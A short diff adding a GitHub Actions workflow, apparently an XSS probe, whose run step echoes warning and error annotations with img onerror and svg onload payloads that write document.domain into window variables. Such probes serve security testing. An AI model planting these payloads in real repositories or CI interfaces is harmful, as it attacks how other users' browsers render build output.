@@ -1,0 +1,12 @@
+name: S33
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "::warning title=WT<img src=x onerror=window.__s33w=document.domain>::WM<svg onload=window.__s33wm=document.domain>"
+          echo "::error title=ET<img src=z onerror=window.__s33e=document.domain>::EM<img src=q onerror=window.__s33em=document.domain>"
